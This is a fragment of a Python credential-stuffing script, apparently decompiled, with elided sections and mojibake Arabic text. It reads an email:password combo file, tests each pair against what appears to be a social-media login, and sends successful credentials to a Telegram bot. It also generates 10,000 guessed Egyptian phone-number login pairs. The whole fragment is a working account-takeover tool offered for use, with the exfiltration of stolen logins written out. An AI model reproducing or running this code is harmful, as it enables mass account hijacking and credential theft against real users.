...
try:
    ...
    try:
        ...
        r = requests.session()
        print(AAlosh)
        TOOLS = input(C + ' Ø§Ø®ØªØ± : ' + B)
        if TOOLS == '1':
            os.system('clear')
            ID = input(X + '[' + Z + '!' + X + ']' + F + 'Id  :\n' + B)
            webbrowser.open('https://t.me/khaledpipo1')
            tok = input(X + '[' + Z + '!' + X + ']' + F + 'Tokn: \n' + B)
            webbrowser.open('https://t.me/khaledpipo1')
            file = input(X + '[' + Z + '!' + Z + ']' + F + ' combo  :\n' + B)
            print(B)
            print('--------------------------------------------------')
            fuck = open(file, 'r')
            while True:
                user = fuck.readline().split('\n')[0]
                Aloshmil = user.split(':')[0]
                Aloshps = user.split(':')[1]
                ...
                if 'xc_message' in shot:
                    ...
                    r.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text= ØªÙ Ø§ÙØµÙØ¯ \n ====================\n.â. Email   (  {Aloshmil}  )\n.â. password  (  {Aloshps}  )\n ====================\n By :- @khaledpipo :-  @khaledpipo1 â ")
                elif 'checkpointSubmitButton-actual-button' in shot:
                    print(X + ' Email ==> : ' + Aloshmil + ': pass ==> : ' + Aloshps)
                    r.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\t\t\tÙ \n ====================\n.â. Email   (  {Aloshmil}  )\n.â. password  (  {Aloshps}  )\n ====================\n By :- @khaledpipo :-  @khaledpipo1 â ")
        ...
        h = 0
        while h < 10000:
            c = str(''.join((random.choice(make) for i in range(8))))
            kj = '+2012' + c
            jk = '012' + c
            combo = kj + ':' + jk
            print(combo)
            g = open('khaledpipo.txt', 'a')
            g.write(combo + '\n')
            h = h + 1
